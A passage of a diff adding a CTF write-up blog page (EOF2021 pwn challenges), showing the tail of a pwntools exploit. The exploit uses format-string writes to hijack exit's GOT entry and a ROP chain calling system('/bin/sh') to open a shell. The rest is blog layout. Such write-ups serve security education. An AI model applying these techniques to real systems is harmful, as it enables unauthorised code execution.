class="string">f&#x27;Libc base : <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">info(<span class="string">f&#x27;Code base : <span class="subst">&#123;<span class="built_in">hex</span>(code_base)&#125;</span>&#x27;</span>)</span><br><span class="line">info(<span class="string">f&#x27;system @ libc : <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&#x27;</span>)</span><br><span class="line">info(<span class="string">f&#x27;GOT of exit : <span class="subst">&#123;<span class="built_in">hex</span>(exit_got)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hijack exit&#x27;s GOT to run main again.</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%22$hn&#x27;</span>.<span class="built_in">format</span>( (code_base + <span class="number">0x1211</span>) &amp; <span class="number">0xffff</span> ).ljust(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span>).encode() + p64(exit_got)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bye\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hijack exit@plt.got to pop_r15_ret and setup rop chain to open shell</span></span><br><span class="line">info(<span class="string">&#x27;Stacking ROPchain.&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%28$hn&#x27;</span>.<span class="built_in">format</span>( (pop_r15_ret) &amp; <span class="number">0xffff</span> ).encode() </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span>.join([</span><br><span class="line">    p64(pop_rdi_ret),</span><br><span class="line">    p64(bin_sh),</span><br><span class="line">    p64(system),</span><br><span class="line">])</span><br><span class="line">print(hexdump(rop_chain))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, rop_chain)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;Spawning a shell. OuO&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>喜歡這些內容嗎? 歡迎訂閱我的部落格!</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/EOF2021/" rel="tag"># EOF2021</a>
+              <a href="/tags/AIS3-EOF/" rel="tag"># AIS3 EOF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/InfoSec/Writeup_202101_TeamT5SecurityCamp/" rel="prev" title="Write-up:: TeamT5資安研習營 - 實作題目分析">
+      <i class="fa fa-chevron-left"></i> Write-up:: TeamT5資安研習營 - 實作題目分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF2NOP-%E8%A7%A3%E9%A1%8C%E6%A6%82%E8%A7%80"><span class="nav-number">1.</span> <span class="nav-text">CTF2NOP 解題概觀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ransomeware"><span class="nav-number">2.1.</span> <span class="nav-text">ransomeware</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EDUshell"><span class="nav-number">3.1.</span> <span class="nav-text">EDUshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Illusion"><span class="nav-number">3.2.</span> <span class="nav-text">Illusion</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="TwinkleStar03"
+      src="/images/avatar_sena.png">
+  <p class="site-author-name" itemprop="name">TwinkleStar03</p>
+  <div class="site-description" itemprop="description">ヾ(≧▽≦*)o Pwning my world<br>InfoSec // CTFer // Robotics<br></div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:star@twinklestar03.com" title="E-mail → mailto:star@twinklestar03.com"><i class="fa fa-envelope fa-fw"></i>E-mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/star12465/" title="Facebook → https:&#x2F;&#x2F;www.facebook.com&#x2F;star12465&#x2F;" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TwinkleStar03</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
